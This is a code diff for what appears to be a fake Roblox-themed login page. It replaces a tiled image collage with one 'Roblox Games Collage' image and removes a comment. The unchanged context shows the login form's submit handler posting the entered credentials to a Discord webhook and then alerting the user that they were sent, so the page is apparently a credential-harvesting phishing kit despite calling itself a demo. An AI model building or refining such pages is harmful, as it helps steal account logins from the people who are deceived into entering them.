@@ -221,60 +221,22 @@ body{
   text-decoration:none;
 }
 
-/* -------- RIGHT SIDE GAME COLLAGE -------- */
+/* -------- RIGHT SIDE IMAGE -------- */
 
 .right{
   flex:1;
-  position:relative;
-  background:radial-gradient(circle at 20% 30%, #111827, #000);
-  overflow:hidden;
-}
-
-.right::before{
-  content:'';
-  position:absolute;
-  inset:0;
-  background:linear-gradient(120deg, #00c6ff22, #ff00cc22);
-  filter:blur(100px);
-}
-
-.tiles{
-  position:absolute;
-  inset:0;
   display:flex;
-  flex-wrap:wrap;
   justify-content:center;
-  align-content:center;
-  gap:30px;
-  padding:60px;
+  align-items:center;
+  background:#000;
+  padding: 20px;
 }
 
-.tile{
-  width:260px;
-  height:170px;
-  border-radius:20px;
-  overflow:hidden;
-  box-shadow:0 15px 40px rgba(0,0,0,0.7);
-  transition:0.3s ease;
-}
-
-.tile img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-}
-
-.tile:nth-child(odd){
-  transform:rotate(-8deg);
-}
-
-.tile:nth-child(even){
-  transform:rotate(8deg);
-}
-
-.tile:hover{
-  transform:scale(1.05) rotate(0deg);
-  z-index:10;
+.right img {
+  max-width: 100%;
+  max-height: 100vh;
+  object-fit: contain;
+  border-radius: 20px;
 }
 
 /* Responsive */
@@ -341,26 +303,10 @@ body{
   </div>
 
   <div class="right">
-    <div class="tiles">
-      <div class="tile">
-        <img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee" />
-      </div>
-      <div class="tile">
-        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb" />
-      </div>
-      <div class="tile">
-        <img src="https://images.unsplash.com/photo-1511512578047-dfb367046420" />
-      </div>
-      <div class="tile">
-        <img src="https://images.unsplash.com/photo-1492724441997-5dc865305da7" />
-      </div>
-      <div class="tile">
-        <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e" />
-      </div>
-      <div class="tile">
-        <img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085" />
-      </div>
-    </div>
+    <img 
+      src="https://i.imgur.com/DA2cH9W.png" 
+      alt="Roblox Games Collage" 
+    />
   </div>
 
 </div>
@@ -387,7 +333,6 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
     .then(response => {
       if (response.ok) {
         alert("This is a demo page. Credentials sent to Discord webhook.");
-        // Optionally, clear the form
         document.getElementById("loginForm").reset();
       } else {
         alert("Failed to send data.");
